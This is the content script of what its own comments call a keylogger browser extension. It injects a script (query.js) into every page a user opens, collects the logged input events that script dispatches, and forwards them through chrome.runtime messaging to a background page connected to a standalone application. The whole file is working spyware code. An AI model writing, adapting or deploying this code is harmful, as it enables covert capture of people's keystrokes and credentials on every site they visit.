// Debugging function. Set to false __config.__debug__ to 
// avoid messages in console
function __printDebug(message) {
	if (__config.__debug__) { console.log(message); }
}

// Return time in human readable format
function __time() {
    var d = new Date();
    return d.toLocaleString();
}

// Object that will contain the logging informations
var keylog = null;


// function that inject query.js in every new document
function injectKeylogger() {
    var s = document.createElement('script');
    s.src = chrome.extension.getURL('query.js');
    (document.head||document.documentElement).appendChild(s);
    s.onload = function() {
        s.parentNode.removeChild(s);
    };
}

// ***** MAIN *****
// Insert keylogger at each document onload event
document.onload = injectKeylogger();

// // Event listener. This event listener will send message to app using
// // chrome.runtime to pass it to the background of the page
document.addEventListener(__config.dispatchID, function(e) {
    // keylog is an abject that contains all the logging informations
    // passed from the injected script to the injecter script
    keylog = e.detail;
    
    // Now we have to pass all those informations to the background script that has an interface with 
    // the standalone application
    chrome.runtime.sendMessage({ 
        protocol: "report_event",
        content: keylog
    });
    
});


